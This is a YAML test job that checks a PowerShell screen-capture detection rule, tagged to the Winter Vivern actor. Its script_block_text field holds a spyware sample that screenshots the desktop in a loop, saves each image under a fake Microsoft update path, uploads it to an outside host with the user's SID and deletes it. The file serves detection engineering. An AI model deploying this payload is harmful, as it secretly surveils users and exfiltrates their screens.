type: job
name: Windows Screen Capture Via Powershell
detection:
  source: escu
  name: "ESCU - Windows Screen Capture Via Powershell - Rule"
  id: 5e0b1936-8f99-4399-8ee2-9edc5b32e170
description: |
  Validates detection of screen capture through System.Drawing:
  PowerShell/Operational EID 4104 (Script Block Logging) records a block
  that defines a screenshot function creating a Drawing.Bitmap, getting its
  drawing surface with [Drawing.Graphics]::FromImage and copying the screen
  into it with CopyFromScreen before saving it to a file, plus a loop that
  calls it alongside an upload function.
tags: [winter-vivern]

mitre:
  tactics: [collection]
  techniques: [T1113]

state:
  domain_short:       CORP
  domain_tld:         local
  domain_short_lower: fn.lower(ref.domain_short)
  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)

workloads:
  - scenario: scenarios/windows/powershell/script-block/script-block-logged
    bindings:
      domain_short:      ref.domain_short
      domain_tld:        ref.domain_tld
      computer:          ref.computer
      provider_guid:     "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
      script_block_text: "[Reflection.Assembly]::LoadWithPartialName('System.Drawing');\r\n\
        \x20function screenshot([Drawing.Rectangle]$bounds, $path) \r\n\
        \x20{\r\n\
        \x20$bmp = New-Object Drawing.Bitmap $bound.width, $bound.height;\r\n\
        \x20$graphics = [Drawing.Graphics]::FromImage($bmp);\r\n\
        \x20$graphics.CopyFromScreen($bound.Location, [Drawing.Point]::Empty, $bound.size);\r\n\
        \x20$bmp.Save($path);\r\n\
        \x20$graphics.Dispose();\r\n\
        \x20$bmp.Dispose()\r\n\
        \x20};\r\n\
        \x20$bounds = [Drawing.Rectangle]::FromLTRB(0,0,1900,1080);\r\n\
        \x20function downloadFileUP($f){$name=$f.repalce(':\\','').replace('\\','/');\r\n\
        \x20$valu=([System.Security.Principal.WindosIdentity]::GetCurrent()).User.Value;\r\n\
        \x20$vu=$valu+$name;\r\n\
        \x20Invoke-RestMethod -Uri 'https://wintervivern.com/screenshot.php' -Method Post -InFile $f -Headers@{'filename=$vu'} -UseDefaultCredentials};\r\n\
        \x20$i=0;\r\n\
        \x20while($true)\r\n\
        \x20{\r\n\
        \x20$i=$i+1;$f='c:\\Users\\Public\\MicrosoftUpdateClient\\Microsoft_Update_tool_'+$i+'.dat';\r\n\
        \x20screenshot $bounds $f;\r\n\
        \x20sleep 1;\r\n\
        \x20downloadFileUP($f);\r\n\
        \x20sleep 9;\r\n\
        \x20remote-Item $f -Force\r\n\
        \x20}\r\n"
    expectation:
      expected: alert
      summary: "PowerShell logs a block that captures the screen with Graphics.CopyFromScreen"
      mitre:
        tactics: [collection]
        techniques: [T1113]
